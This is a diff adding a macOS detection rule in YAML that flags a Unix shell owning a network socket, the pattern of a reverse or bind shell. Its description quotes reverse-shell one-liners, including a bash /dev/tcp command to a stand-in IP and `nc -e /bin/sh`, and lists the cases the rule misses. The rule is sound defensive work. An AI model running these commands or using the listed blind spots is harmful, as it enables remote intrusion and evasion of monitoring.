@@ -1,0 +1,36 @@
+name: Shell holding a network connection to another host (reverse or bind shell)
+id: 46ecd3c3-0b67-42a4-99ef-c6a2854a5c9b
+version: 1.0.0
+platforms: [macos]
+description: |
+  A Unix shell (sh, bash, zsh, dash, ksh, csh, tcsh, fish) owns an established TCP or
+  connected UDP socket to another host. Interactive shells never open sockets
+  themselves: a socket in a shell's file table is the shape of a reverse shell
+  (`bash -i >& /dev/tcp/203.0.113.9/4444 0>&1`, `nc -e /bin/sh`, `socat exec:sh`,
+  `python -c 'pty.spawn("/bin/sh")'` after dup2 of a socket) or of a bind shell answering
+  an inbound connection. Not covered: `mkfifo` relay loops, where `nc` holds the socket
+  and the shell only reads a pipe, and renamed copies of a shell outside the usual
+  paths. Loopback connections are not reported by the poller.
+  Matches on the executable path, or on the process name when the identity came from
+  the kernel (evt.arg[identity] = unverified, the process was not seen executing).
+  Known benign: rare. A shell script that opens /dev/tcp itself (health checks in some
+  install scripts); remote-management agents that hand a socket to a shell.
+  Limitation: the socket is found by polling (default every second, and right after
+  each exec), so a shell that connects and exits between two polls is missed.
+labels:
+  tactic.id: TA0002
+  tactic.name: Execution
+  technique.id: T1059.004
+  technique.name: Unix Shell
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+  - https://attack.mitre.org/techniques/T1095/
+condition: >
+  net_remote_connection
+  and (ps.exe in shells or ps.name in shell_names)
+output: "%ps.exe (pid %ps.pid, parent %ps.parent.exe) has a %net.proto %net.direction connection %net.sip:%net.sport -> %net.dip:%net.dport"
+severity: high
+action: []
+tests:
+  atomic: []
+min-engine-version: 0.1.0
